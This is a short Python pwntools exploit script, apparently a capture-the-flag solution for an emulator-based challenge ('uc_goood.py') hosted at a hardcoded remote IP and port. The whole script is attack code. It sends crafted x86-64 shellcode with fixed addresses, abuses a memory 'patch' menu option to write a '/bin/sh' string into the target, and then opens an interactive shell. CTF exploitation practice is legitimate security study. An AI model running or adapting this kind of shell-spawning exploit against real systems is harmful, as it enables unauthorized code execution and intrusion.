#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '111.186.59.29', 10088
binary = 'python3 ./uc_goood.py'.split()

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary)

def choice(idx):
    sla("?: \x00", str(idx))

def admin():
    choice(1)
    sla("(y/[n])\x00", "y")

def user():
    choice(2)
    sla("(y/[n])\x00", "y")

def patch(addr, size, data):
    choice(3)
    sa("addr: \x00", p64(addr))
    sa("size: \x00", p64(size))
    sa("data: \x00", data)

if __name__ == "__main__":
    shellcode = asm('''
        mov rax, 0xdeadbef009a
        mov r9, 0xbabecafe1e6
        mov r8, 0xbabecafe000
        mov rbx, 0xdeadbeef067
        mov qword ptr [rsp], rbx
        jmp qword ptr [rsp]
    ''')
    sl(shellcode)
    s = "k33nlab/bin/sh\x00"
    patch(0xbabecafe000, len(s), s)
    choice(2)
    io.interactive()
